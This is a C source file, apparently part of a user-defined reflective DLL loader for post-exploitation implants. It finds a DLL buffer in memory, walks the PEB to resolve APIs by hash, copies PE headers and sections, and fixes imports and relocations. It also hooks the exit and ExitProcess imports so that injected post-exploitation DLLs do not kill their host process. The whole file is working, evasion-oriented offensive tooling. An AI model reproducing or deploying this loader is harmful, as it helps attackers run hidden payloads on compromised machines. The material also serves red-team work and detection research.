#include <intrin.h>

#include "Utils.h"
#include "StdLib.h"
#include "Hash.h"
#include "End.h"

#include "FunctionResolving.h"

/*******************************************************************
 * To avoid problems with function positioning, do not add any new
 * functions above this pragma directive.
********************************************************************/
#pragma code_seg(".text$c")

/**
 * Get the address of the calling function.
 * 
 * Note: this function cannot be inlined by the compiler or we will 
 * not get the address we expect.
 *
 * @return A pointer to the location in memory.
*/
__declspec(noinline) void* GetLocation() {
    return _ReturnAddress();
}

/**
 * Find the address of the Process Environment Block (PEB)
 *
 * @return A pointer to the PEB.
*/
_PPEB GetPEBAddress() {
#ifdef _WIN64
    return (_PPEB)__readgsqword(0x60);
#elif _WIN32
    return (_PPEB)__readfsdword(0x30);
#endif
}

/**
 * Determine the base address of whatever buffer we are loading.
 *
 * Note: This function is to support x64/x86 Double Pulsar style loaders.
 * 
 * @return The base address of the buffer.
*/
ULONG_PTR FindBufferBaseAddress() {
#if _DEBUG
    return (ULONG_PTR)debug_dll;
#elif _WIN64
    // This will run when UDRL is an x64 prepended reflective loader.
    return (ULONG_PTR)&LdrEnd + 1;
#elif _WIN32
    // This will run when UDRL is an x86 prepended reflective loader.
    return (ULONG_PTR)((char*)LdrEnd() + 2);
#endif
}

/**
 * Determine the base address of the Dll we are loading.
 * 
 * Note: This function is to support x64/x86 Stephen Fewer style reflective loaders.
 *
 * @return The base address of the Dll.
*/
ULONG_PTR FindBufferBaseAddressStephenFewer() {
#if _DEBUG
    return (ULONG_PTR)debug_dll;
#else
    // We will start searching backwards from our callers return address.
    ULONG_PTR imageBase = (ULONG_PTR)GetLocation();
    // Loop through memory backwards searching for the target DLL's base address
    // We dont need SEH style search as we shouldnt generate any access violations with this
    while (TRUE) {
        if (((PIMAGE_DOS_HEADER)imageBase)->e_magic == IMAGE_DOS_SIGNATURE) {
            ULONG_PTR ntHeader = ((PIMAGE_DOS_HEADER)imageBase)->e_lfanew;
            // Some x64 dll's can trigger a bogus signature (IMAGE_DOS_SIGNATURE == 'POP r10'),
            // We sanity check the e_lfanew with an upper threshold value of 1024 to avoid problems.
            if (ntHeader >= sizeof(IMAGE_DOS_HEADER) && ntHeader < 1024) {
                ntHeader += imageBase;
                // Break if we have found a valid MZ/PE header
                if (((PIMAGE_NT_HEADERS)ntHeader)->Signature == IMAGE_NT_SIGNATURE) {
                    return imageBase;
                }
            }
        }
        imageBase--;
    }
#endif
}

/**
 * Copy the target DLL's PE header to a new location.
 *
 * @param srcImage A pointer to the base address of the target DLL.
 * @param dstAddress A pointer to the start address of the DLL's new location in memory.
 * @return A Boolean value to indicate success.
*/
BOOL CopyPEHeader(ULONG_PTR srcImage, ULONG_PTR dstAddress) {
    PRINT("[+] Copying PE Header...\n");

    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)(srcImage + ((PIMAGE_DOS_HEADER)srcImage)->e_lfanew);
    PBYTE srcHeader = (PBYTE)srcImage;
    PBYTE dstHeader = (PBYTE)dstAddress;

    DWORD sizeOfHeaders = ntHeader->OptionalHeader.SizeOfHeaders;
    return _memcpy(dstHeader, srcHeader, sizeOfHeaders);
}

/**
 * Copy the target DLL's PE sections to a new location.
 *
 * @param srcImage A pointer to the base address of the target DLL.
 * @param dstAddress A pointer to the start address of the DLL's new location in memory.
 * @return A Boolean value to indicate success.
*/
BOOL CopyPESections(ULONG_PTR srcImage, ULONG_PTR dstAddress) {
    PRINT("[+] Copying Sections...\n");

    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)(srcImage + ((PIMAGE_DOS_HEADER)srcImage)->e_lfanew);
    PBYTE srcHeader = (PBYTE)srcImage;
    PBYTE dstHeader = (PBYTE)dstAddress;

    // SectionHeader = the VA of the first section
    PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER)((ULONG_PTR)&ntHeader->OptionalHeader + ntHeader->FileHeader.SizeOfOptionalHeader);

    // Itterate through all sections, loading them into memory.
    DWORD numberOfSections = ntHeader->FileHeader.NumberOfSections;

    while (numberOfSections--) {
        // dstSection is the VA for this section
        PBYTE dstSection = (PBYTE)dstAddress + sectionHeader->VirtualAddress;

        // srcSection if the VA for this sections data
        PBYTE srcSection = (PBYTE)srcImage + sectionHeader->PointerToRawData;

        // Copy the section over
        DWORD sizeOfData = sectionHeader->SizeOfRawData;
        if (!_memcpy(dstSection, srcSection, sizeOfData)) {
            return FALSE;
        }

        PRINT("\t[+] Copied Section: %s\n", sectionHeader->Name);
        // Get the VA of the next section
        sectionHeader++;
    }
    return TRUE;
}


int my_tolower(int c) {
    // 如果字符是大写字母，则转换成小写
    if (c >= 'A' && c <= 'Z') {
        return c + 'a' - 'A';
    }
    return c;
}

int mystricmp(const char* s1, const char* s2) {
    int c1, c2;
    do {
        c1 = my_tolower((unsigned char)*s1++);
        c2 = my_tolower((unsigned char)*s2++);
        if (c1 == '\0' || c1 != c2) {
            break;
        }
    } while (c1 != '\0');

    return c1 - c2;
}

int __cdecl hookexit(int status)
{
    RTL_EXITUSERTHREAD myRtlExitUserThread = (RTL_EXITUSERTHREAD)GetProcAddressByHash(GetPEBAddress(), NTDLLDLL_HASH, RtlExitUserThread_HASH);
    myRtlExitUserThread(status);
    return 0;
}

void __stdcall hookExitProcess(UINT statuscode)
{
    RTL_EXITUSERTHREAD myRtlExitUserThread = (RTL_EXITUSERTHREAD)GetProcAddressByHash(GetPEBAddress(), NTDLLDLL_HASH, RtlExitUserThread_HASH);
    myRtlExitUserThread(statuscode);
}

/**
 * Resolve imported functions.
 *
 * @param ntHeader A pointer to the target DLL 's ntHeader.
 * @param dstAddress A pointer to the start address of the DLL's new location in memory.
 * @param winApi A pointer to a structure of WINAPI pointers.
*/
void ResolveImports(PIMAGE_NT_HEADERS ntHeader, ULONG_PTR dstAddress, PWINDOWSAPIS winApi) {
    PRINT("[*] Resolving Imports... \n");

    PIMAGE_DATA_DIRECTORY importDataDirectoryEntry = &(ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT]);
    /**
    * We assume there is an import table to process
    * importDescriptor is the first importDescriptor entry in the import table
    */
    PIMAGE_IMPORT_DESCRIPTOR importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(dstAddress + importDataDirectoryEntry->VirtualAddress);

    // Itterate through all imports
    while (importDescriptor->Name) {
        LPCSTR libraryName = (LPCSTR)(dstAddress + importDescriptor->Name);
        // Use LoadLibraryA to load the imported module into memory
        //ProxyLoad
        ULONG_PTR libraryBaseAddress = (ULONG_PTR)winApi->LoadLibraryA(libraryName);

        PRINT("[+] Loaded Module: %s\n", (char*)libraryName);

        // INT = VA of the Import Name Table (OriginalFirstThunk)
        PIMAGE_THUNK_DATA INT = (PIMAGE_THUNK_DATA)(dstAddress + importDescriptor->OriginalFirstThunk);
        // IAT = VA of the Import Address Table (FirstThunk)
        PIMAGE_THUNK_DATA IAT = (PIMAGE_THUNK_DATA)(dstAddress + importDescriptor->FirstThunk);

        // Itterate through all imported functions, importing by ordinal if no name present
        while (DEREF(IAT)) {
            // Sanity check INT as some compilers only import by FirstThunk
            if (INT && INT->u1.Ordinal & IMAGE_ORDINAL_FLAG) {
                // Get the VA of the modules NT Header
                PIMAGE_NT_HEADERS libraryPEHeader = (PIMAGE_NT_HEADERS)(libraryBaseAddress + ((PIMAGE_DOS_HEADER)libraryBaseAddress)->e_lfanew);

                PIMAGE_DATA_DIRECTORY exportDataDirectoryEntry = &(libraryPEHeader)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

                // Get the VA of the export directory
                PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)(libraryBaseAddress + exportDataDirectoryEntry->VirtualAddress);

                // Get the VA for the array of addresses
                ULONG_PTR addressArray = libraryBaseAddress + exportDirectory->AddressOfFunctions;

                // Use the import ordinal (- export ordinal base) as an index into the array of addresses
                addressArray += (IMAGE_ORDINAL(INT->u1.Ordinal) - exportDirectory->Base) * sizeof(DWORD);

                // Patch in the address for this imported function
                PRINT("\t[*] Ordinal: %d\tAddress: %p\n", INT->u1.Ordinal, libraryBaseAddress + DEREF_32(addressArray));
                DEREF(IAT) = libraryBaseAddress + DEREF_32(addressArray);
            }
            else {
                // Get the VA of this functions import by name struct
                PIMAGE_IMPORT_BY_NAME importName = (PIMAGE_IMPORT_BY_NAME)(dstAddress + DEREF(IAT));
                LPCSTR functionName = importName->Name;

                // Use GetProcAddress and patch in the address for this imported function
                ULONG_PTR functionAddress = (ULONG_PTR)winApi->GetProcAddress((HMODULE)libraryBaseAddress, functionName);
                PRINT("\t[*] Function: %s\tAddress: %p\n", (char*)functionName, functionAddress);
                DEREF(IAT) = functionAddress;

                //Hook Exit
                PIC_STRING(cexit, "exit");
                PIC_STRING(c_Exit, "_Exit");
                PIC_STRING(cquick_exit, "quick_exit");
                PIC_STRING(cExitProcess, "ExitProcess");

                if (mystricmp(functionName, cexit) == 0 || mystricmp(functionName, c_Exit) == 0 || mystricmp(functionName, cquick_exit) == 0)
                {
                    DEREF(IAT) = (size_t)hookexit;
                }
                else if (mystricmp(functionName, cExitProcess) == 0)
                {
                    DEREF(IAT) = (size_t)hookExitProcess;
                }
              
            }

            // Get the next imported function
            ++IAT;
            if (INT) {
                ++INT;
            }
        }

        // Get the next import
        importDescriptor++;
    }
    return;
}

/**
 * Calculate the base address delta and perform relocations.
 *
 * @param ntHeader A pointer to the target DLL's ntHeader.
 * @param dstAddress A pointer to the start address of the DLL's new location in memory.
*/
void ProcessRelocations(PIMAGE_NT_HEADERS ntHeader, ULONG_PTR dstAddress) {
    PRINT("[*] Processing relocations... \n");

    // Calculate the base address delta
    ULONG_PTR delta = dstAddress - ntHeader->OptionalHeader.ImageBase;
    PRINT("[+] Delta: 0x%X \n", delta);

    PIMAGE_DATA_DIRECTORY relocDataDirectoryEntry = &ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

    // Check if there are any relocations present
    if ((relocDataDirectoryEntry)->Size > 0) {
        // baseRelocation is the first entry (IMAGE_BASE_RELOCATION)
        PIMAGE_BASE_RELOCATION baseRelocation = (PIMAGE_BASE_RELOCATION)(dstAddress + relocDataDirectoryEntry->VirtualAddress);
        PRINT("[*] Base Relocation: %p\n", baseRelocation);

        // Itterate through all entries...
        while (baseRelocation->SizeOfBlock) {
            // relocationBlock = the VA for this relocation block
            ULONG_PTR relocationBlock = (dstAddress + baseRelocation->VirtualAddress);
            PRINT("\t[*] Relocation Block: %p\n", relocationBlock);

            // relocationCount = number of entries in this relocation block
            ULONG_PTR relocationCount = (baseRelocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(IMAGE_RELOC);

            // relocation is the first entry in the current relocation block
            PIMAGE_RELOC relocation = (PIMAGE_RELOC)((ULONG_PTR)baseRelocation + sizeof(IMAGE_BASE_RELOCATION));

            // We itterate through all the entries in the current block...
            while (relocationCount--) {
                /**
                * PRINT("\t\t[*] Relocation - type: %x offset: %x\n", ((PIMAGE_RELOC)relocation)->type, ((PIMAGE_RELOC)relocation)->offset);
                * Perform the relocation, skipping IMAGE_REL_BASED_ABSOLUTE as required.
                * We dont use a switch statement to avoid the compiler building a jump table
                * which would not be very position independent!
                */
                if ((relocation)->type == IMAGE_REL_BASED_DIR64)
                    *(ULONG_PTR*)(relocationBlock + relocation->offset) += delta;
                else if (relocation->type == IMAGE_REL_BASED_HIGHLOW)
                    *(DWORD*)(relocationBlock + relocation->offset) += (DWORD)delta;
                else if (relocation->type == IMAGE_REL_BASED_HIGH)
                    *(WORD*)(relocationBlock + relocation->offset) += HIWORD(delta);
                else if (relocation->type == IMAGE_REL_BASED_LOW)
                    *(WORD*)(relocationBlock + relocation->offset) += LOWORD(delta);
                // Get the next entry in the current relocation block
                relocation++;
            }
            // Get the next entry in the relocation directory
            baseRelocation = (PIMAGE_BASE_RELOCATION)((ULONG_PTR)baseRelocation + baseRelocation->SizeOfBlock);
        }
    }
    return;
}

/**
 * Resolve .rdata information required by post exploitation DLLs
 *
 * @param srcImage A pointer to the base address of the target DLL.
 * @param dstAddress A pointer to the start address of the DLL's new location in memory.
 * @param rdata A pointer to RDATA_SECTION structure
 * @return A Boolean value to indicate success.
*/
BOOL ResolveRdataSection(ULONG_PTR srcImage, ULONG_PTR dstAddress, PRDATA_SECTION rdata) {
    PRINT("[+] Resolving .rdata information...\n");

    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)(srcImage + ((PIMAGE_DOS_HEADER)srcImage)->e_lfanew);
    PBYTE srcHeader = (PBYTE)srcImage;
    PBYTE dstHeader = (PBYTE)dstAddress;

    // SectionHeader = the VA of the first section
    PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER)((ULONG_PTR)&ntHeader->OptionalHeader + ntHeader->FileHeader.SizeOfOptionalHeader);

    // Itterate through all sections, loading them into memory.
    DWORD numberOfSections = ntHeader->FileHeader.NumberOfSections;

    while (numberOfSections--) {
        // Find .rdata section
        constexpr DWORD rdataHash = CompileTimeHash(".rdata");
        // The name buffer is always 8 bytes. However we want to calculate the hash only from the first 6 bytes
        if (RunTimeHash((char*)sectionHeader->Name, 6) == rdataHash) {
            // dstSection is the VA for this section
            PBYTE dstSection = (PBYTE)dstAddress + sectionHeader->VirtualAddress;

            rdata->start = (char*)dstSection;
            rdata->length = sectionHeader->SizeOfRawData;
            rdata->offset = ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IAT].Size;
            return TRUE;
        }

        // Get the VA of the next section
        sectionHeader++;
    }
    return FALSE;
}
